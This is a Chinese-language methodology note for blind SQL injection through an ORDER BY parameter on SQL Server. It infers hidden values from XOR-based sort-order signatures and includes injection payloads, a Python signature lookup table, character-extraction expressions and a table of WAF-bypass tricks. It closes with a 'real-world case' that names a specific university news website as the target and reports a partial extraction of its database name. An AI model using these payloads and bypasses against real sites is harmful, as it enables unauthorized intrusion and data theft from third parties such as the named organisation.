# XOR 排序盲注方法论

## 适用场景

- ORDER BY 注入点，只有排序信号无法直接读取数据
- 页面上有多条记录且每条记录有可量化的稳定特征（长度、Unicode 码点等）
- WAF 拦截了 `SUBSTRING`/`CASE WHEN`/`IIF`/`END` 等常规布尔/报错注入关键字

## 核心原理

ORDER BY 不暴露数据值，但排序后的**第一条记录 Id** 取决于排序值的分布。

```
已知: 4条记录的某个特征值 = [42, 20, 38, 20]
未知: 目标值 X

发请求: ORDER BY (特征值 ^ X) ASC
返回: 首条 Id = 最小值对应的行

对每个 X 值，首条 Id 构成唯一的"签名"
通过匹配签名反推 X
```

## 签名收集公式

对每个位置 P 的目标字符 UNICODE 值 X：

```
S1 = (基准列 ^ X) ASC 返回的首行Id
S2 = (基准列 ^ X) DESC 返回的首行Id
S3 = (基准列 ^ (X+3)) DESC 返回的首行Id
S4 = (基准列 ^ (X+5)) DESC 返回的首行Id
...
Sn = (基准列 ^ (X+N)) DESC 返回的首行Id
```

维度越多，签名越唯一。

## 签名查找表生成

```python
dl = [42, 20, 38, 20]  # 已知的基准列值
ids = ['9b38', 'aafc', 'b848', 'bdfb']

sig_map = {}
for N in range(256):
    v0 = [d ^ N for d in dl]
    v5 = [d ^ (N+5) for d in dl]
    key = f"{fa(v0)}|{fa(v5)}"   # fa = 取ASC最小值行
    sig_map[key].append(N)
```

## 实战步骤

### Step 1: 确认基准列可用

```sql
ORDER BY DATALENGTH(Title)   # 确认函数/列可通过WAF
```

### Step 2: 收集已知基准值

获取所有行的目标列数值（手工或通过多次请求比对）。

### Step 3: 发请求收集签名

```http
GET /api?rows=1&sidx=DATALENGTH(Title)^LEN(ORIGINAL_DB_NAME())&sord=desc
```
记录返回的第一条 Id。

重复用不同偏移 `+3`, `+5`, `+7`, `+10` 等获取更多签名。

### Step 4: 本地查表匹配

对比预计算的签名表，找出唯一匹配。

### Step 5: 逐位提取

用 `STUFF` 代替被拦截的 `SUBSTRING`：

```sql
-- 位置1 (首字符)
LEFT(ORIGINAL_DB_NAME(), 1)

-- 位置N (第N个字符)
STUFF(ORIGINAL_DB_NAME(), 1, N-1, '')
-- 例: STUFF(ORIGINAL_DB_NAME(), 1, 2, '') 返回去掉前2字符后的剩余部分
```

然后用 `UNICODE()` 取码点，用 XOR 签名推断。

## 基准列选择要求

1. 每行的值必须不同（否则签名退化为单值）
2. 值在 XOR 后的排序应随目标值变化而变化
3. 优先选字节数分布广的列：`DATALENGTH()` > `LEN()` > 固定长度列

## 注意事项

- **中文 Unicode 的高字节**可能导致低 8 位 XOR 不改变排序 — 此时需扩大偏移范围到 0-65535
- **记录数越少**，签名空间越小，需要加的偏移维度越多
- **N 值查找表**可预先对 1-255 生成，查表时直接 O(1) 匹配

## 已知绕过技巧速查

| 被拦 | 替代 |
|------|------|
| `SUBSTRING` | `STUFF(col,1,N-1,'')` - 删前N-1字符 |
| 列名白名单 | `%09` (tab) 在合法列名后追加表达式 |
| 函数名黑名单 | `system_user+(func(args))` 前缀绕过 |
| `&` URL分隔冲突 | `%7C` (`\|`) 或用 `--data-urlencode` |
| `%` (取模) | 改用 XOR `^` 或 `*` 乘法 |
| `CASE WHEN END` | XOR签名法完全不依赖条件表达式 |
| `DB_NAME` 过滤 | `ORIGINAL_DB_NAME()` |
| `@@version` 过滤 | `SYSTEM_USER` / `CURRENT_TIMESTAMP` |
| 双 LEN 嵌套 | `DATALENGTH` 替代第二个 `LEN` |

## 实战案例

2026-07-03 厦门大学新闻网 (xwxx.xmu.edu.cn)
- 注入点: `sidx` 参数 ORDER BY
- 4条记录，DATALENGTH(Title)=[42,20,38,20]
- 用6个不同偏移的XOR签名成功推断 `LEN(ORIGINAL_DB_NAME()) = 14`
- 逐字符提取因XOR区分度限制（仅3种排序信号）暂未完成全部14字符
- 首字符通过域名推断+多维度交叉确认为 `x` (UNICODE 120)
